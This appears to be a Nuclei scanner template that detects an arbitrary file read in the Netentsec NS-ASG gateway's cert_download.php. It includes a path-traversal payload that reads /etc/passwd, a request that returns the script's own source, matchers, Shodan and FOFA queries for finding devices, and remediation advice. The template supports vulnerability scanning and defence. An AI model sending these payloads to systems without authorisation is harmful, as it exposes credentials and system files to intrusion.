id: nsasg-arbitrary-file-read

info:
  name: NS ASG - 本地文件包含漏洞
  author: pikpikcu,ritikchaddha
  severity: high
  description: |
    该模板用于检测 NS ASG - 本地文件包含漏洞。该类漏洞通常源于文件路径、下载参数或资源加载接口缺少目录穿越和权限校验，导致任意文件被读取或包含。模板会向 `/admin/cert_download.php?file=pqpqpqpq.txt&certfile=../../../../../../../../etc/passwd`、`/admin/cert_download.php?file=pqpqpqpq.txt&certfile=cert_download.php` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可读取配置文件、源码、日志、密钥或系统敏感文件。
    - 若文件包含点可被利用，可能进一步造成代码执行、凭据泄露或对内部系统的持续入侵。
  remediation: |
    - 对文件访问参数使用固定映射或白名单，禁止直接使用用户输入拼接文件路径。
    - 规范化并校验最终路径，阻断 `../`、编码绕过和绝对路径访问。
    - 限制应用进程的文件系统权限，避免配置、密钥和日志被 Web 服务账号读取。
  reference:
    - https://zhuanlan.zhihu.com/p/368054963
    - http://wiki.xypbk.com/Web安全/网康%20NS-ASG安全网关/网康%20NS-ASG安全网关%20任意文件读取漏洞.md
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
    cpe: cpe:2.3:h:netentsec:ns-asg:*:*:*:*:*:*:*:*
  metadata:
    max-request: 2
    shodan-query: http.title:“NS-ASG”
    fofa-query: app="网康科技-NS-ASG安全网关"
    product: ns-asg
    vendor: netentsec
  tags: ns-asg,lfi,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/admin/cert_download.php?file=pqpqpqpq.txt&certfile=../../../../../../../../etc/passwd"
      - "{{BaseURL}}/admin/cert_download.php?file=pqpqpqpq.txt&certfile=cert_download.php"

    stop-at-first-match: true

    matchers-condition: or
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"

      - type: word
        part: body
        words:
          - "$certfile"
          - "application/pdf"
        condition: and
